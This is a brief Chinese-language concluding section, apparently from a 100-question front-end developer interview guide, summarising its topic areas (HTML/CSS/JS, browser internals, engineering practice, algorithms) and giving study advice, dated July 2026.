> **总结：** 这 100 题覆盖了前端面试中 95% 以上的基础考点。HTML/CSS/JS 是根基，浏览器原理是内功，工程化是实战能力，算法是思维训练。建议按模块系统学习，每道题不仅要能说清楚，手写题要能独立写出来。面试时展现「知其然也知其所以然」的深度。

---

*最后更新：2026 年 7 月*

